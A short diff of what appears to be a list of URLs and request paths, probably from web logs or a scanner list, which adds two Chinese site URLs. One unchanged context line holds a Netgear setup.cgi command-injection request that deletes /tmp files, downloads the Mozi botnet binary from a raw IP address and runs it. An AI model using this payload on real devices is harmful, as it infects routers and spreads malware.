@@ -16370,3 +16370,5 @@ http://apiv4.9hits.com/test
 /nehwwioz.php?Fox=d3wL7
 /components/com_jbusinessdirectory/assets/uploadFile.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.235.71.231:46287/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+http://126.net/?0.14571456456051742058548800
+http://www.chinaso.com/?0.1919440362565055241989328
